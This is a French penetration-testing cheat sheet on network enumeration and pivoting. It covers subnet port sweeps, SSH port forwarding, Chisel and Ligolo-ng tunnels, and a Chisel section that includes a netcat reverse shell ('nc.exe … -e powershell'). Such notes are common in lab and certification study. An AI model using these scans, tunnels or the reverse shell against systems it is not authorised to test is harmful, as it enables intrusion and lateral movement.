# Enumération

```bash
arp -a
ip addr
ip route
ss -ntplu 
netstat -ant
```

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

```powershell
1..254 | ForEach-Object { $ip = "192.168.1.$_"; if (Test-NetConnection -ComputerName $ip -Port 445 -InformationLevel Quiet) { "$ip : Port 445 ouvert" } }
```

# SSH

## Redirection de port local

```bash
ssh -L 8080:10.10.10.10:80 user@server.com
```

## Redirection de port distant

```bash
ssh -R 8080:localhost:80 user@server.com
```

## Redirection de port dynamique

```bash
ssh -D 50080 user@server.com
```

## Scénarios combinés

```bash
ssh -R 2222:localhost:22 -D 1080 user@server.com
```

# Chisel

## Redirection de port local

```bash
./chisel server --port 8888
./chisel client 192.168.45.237:8888 5000:127.0.0.1:80
```

## Redirection de port distant

```bash
./chisel server --port 8888 --reverse
./chisel client 192.168.45.237:8888 R:5000:127.0.0.1:80
```

## Obtenir un reverse-shell

```bash
./chisel server -p 9999 --reverse
./chisel client 10.129.183.163:9999 R:4445:localhost:4444
nc.exe 172.16.1.5 4445 -e powershell
```

## Redirection socks5

```bash
chisel.exe server --port 7777 --socks5 
chisel client 192.168.14.12:7777 50080:socks
```

# Ligolo-ng

## Installation

```bash
https://github.com/nicocha30/ligolo-ng/releases
```

## Utilisation

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
agent.exe -connect 192.168.49.115:11601 -ignore-cert
```

## Ajouter route

```bash
sudo ip route add 10.10.150.0/24 dev ligolo
sudo ip route del 10.10.150.0/24 dev ligolo
```

## Reverse / Télécharger fichier

```bash
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
listener_list
```